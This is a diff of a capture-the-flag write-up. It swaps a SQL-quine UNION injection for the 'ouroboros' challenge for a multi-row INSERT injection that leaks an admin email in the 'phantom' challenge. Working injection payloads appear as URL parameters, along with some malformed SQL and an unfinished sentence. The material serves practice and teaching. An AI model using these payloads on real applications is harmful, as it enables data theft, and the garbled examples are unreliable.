@@ -5,144 +5,82 @@ pagination_prev: null
 sidebar_position: 29
 ---
 
-![1](https://github.com/Kunull/Write-ups/assets/110326359/1484f622-d41c-4263-9655-405d71ed15d5)
+![1](https://github.com/Kunull/Write-ups/assets/110326359/e4b143de-c5d8-47ee-bed0-8bd3a124e8cb)
 
 We are provided with the SQL query:
 
 ```sql
-SELECT pw FROM prob_ouroboros WHERE pw='{$_GET[pw]}'
+INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')
 ```
 
-If `$result['pw']` is equal `$_GET['pw']`, the challenge is solved.
+This time, the table is updated based upon the parameter value that we provide.
+If the `no=1`, the email will be displayed as `**************`.
 
-If we provide the following URI parameter:
-
-```
-?pw=' UNION SELECT 1 -- -
-```
-
-The resultant query becomes:
+In order to solve this challenge, we need to insert multiple records at the same time.
+This can be done by listing multiple records in parentheses after `VALUES`, as follows:
 
 ```sql
-SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT 1 -- -'
-```
-
-![3](https://github.com/Kunull/Write-ups/assets/110326359/33c02c9b-464c-4920-b0aa-4d463a1bc01c)
-
-In this case the `$result['pw']` and `$_GET['pw']` differ as follows:
-
-```
-$result['pw']: 1
-$_GET['pw']: ' UNION SELECT 1 -- -
-```
-
-In order to make them the same, we have to use a [Quine](https://en.wikipedia.org/wiki/Quine_(computing)) program.
-
-&nbsp;
-
-## Quine
-
-An example of a SQL Quine is:
-
-```sql
-SELECT Replace(Replace(
-'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine',
-Char(34),Char(39)),Char(36),
-'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine')
-AS Quine 
-```
-### Initial string
-
-```sql
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine'
-```
-### First replacement
-
-```sql
--- - SELECT Replace( -- -
-Replace( 
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine', 
-Char(34), 
-Char(39)
-)
--- - ,CHAR(36),"$") AS Quine', Char(34), Char(39)), Char(36), 'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine -- -
-```
-
-Replace all occurrences of `CHAR(34)` (double quote `"` character) with `CHAR(39)` (single quote `'` character):
-
-```sql
--- - SELECT Replace( -- -
-'SELECT Replace(Replace('$',Char(34),Char(39)),Char(36),'$') AS Quine'
--- - ,Char(36),"$") AS Quine', Char(34), Char(39)), Char(36), 'SELECT REPLACE(REPLACE("$",Char(34),Char(39)),Char(36),"$") AS Quine') AS Quine -- -
-```
-### Second replacement
-
-```sql
--- - SELECT -- -
-Replace(
-'SELECT Replace(Replace('$',Char(34),Char(39)),Char(36),'$') AS Quine', 
-Char(36),
-'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine'
-)
--- - AS Quine -- -
-```
-
-Replace all occurrences of `CHAR(36)` (dollar sign `$` character) with the original string:
-
-```sql
--- - SELECT -- -
-'SELECT Replace(Replace(
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\',
-CHAR(34),CHAR(39)),CHAR(36),
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\')
-AS Quine'
--- - AS Quine -- -
-```
-### Putting it All Together
-
-The final result of the query is the string after both replacements, as follows:
-
-```sql
-SELECT
-'SELECT Replace(Replace(
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\',
-CHAR(34), CHAR(39)), CHAR(36),
-\'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine\')
-AS Quine'
-AS Quine
-```
-
-When this SQL query is executed, it will produce a single column named `Quine` containing the following text:
-
-```sql
-SELECT Replace(Replace(
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',
-CHAR(34), CHAR(39)), CHAR(36),
-'SELECT Replace(Replace("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine')
-AS Quine
-```
-
-Thus, we can see how the query repeats itself.
-
-&nbsp;
-
-Now, we have to implement this for the challenge.
-We will have to modify this Quine to the following:
-
-```sql
-UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -
+INSERT INTO [table_name] VALUES(1, 1, 1), (2, 2, 2), (3, 3, 3);
 ```
 
 If we provide the following URI parameter:
 
 ```
-?pw=' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -
+?joinmail=test'), (0, '[Public IP address]', (SELECT 1 WHERE 1=1)) -- -
+```
+
+You can find your public IP address from [here](https://www.whatismyip.com/).
+
+The resultant query becomes:
+
+```sql
+INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','test'), (0, '[Public IP address]', (SELECT 1 WHERE 1=1)) -- -')
+```
+
+![2](https://github.com/Kunull/Write-ups/assets/110326359/c0edf3a4-1f2c-46ab-bdfe-c9a23f9e5a0d)
+
+As we can see, the two records have been inserted into the table.
+
+In order to retrieve the email however, we will have to store it into a variable. In order to
+
+## Storing value in variable
+
+```sql
+SELECT email FROM prob_phantom WHERE no=1 AS temp
+```
+
+In this example, the email is stored in the `temp` variable.
+
+If we provide the following URI parameter:
+
+```
+?joinmail=test'), (0, '[Public IP address]', (SELECT * FROM (SELECT email FROM prob_phantom WHERE no=1) AS temp)) -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -'
+INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','test'), (0, '[Public IP address]', (SELECT * FROM (SELECT email FROM prob_phantom WHERE no=1) AS temp)) -- -')
 ```
 
-![4](https://github.com/Kunull/Write-ups/assets/110326359/2022ca1c-e568-4989-aa51-186eaacd6810)
+The above query will store
+
+![3](https://github.com/Kunull/Write-ups/assets/110326359/3dc3f1fe-2b74-4923-b804-537b2db133a1)
+
+```
+admin_secure_email@rubiya.kr
+```
+
+If we provide the following URI parameter:
+
+```
+?email=admin_secure_email@rubiya.kr
+```
+
+The resultant query becomes:
+
+```sql
+SELECT email FROM prob_phantom WHERE no=1 AND email='?email=admin_secure_email@rubiya.kr'
+```
+
+![4](https://github.com/Kunull/Write-ups/assets/110326359/e49215ee-88f1-4da7-abf9-55acdc7b5f77)
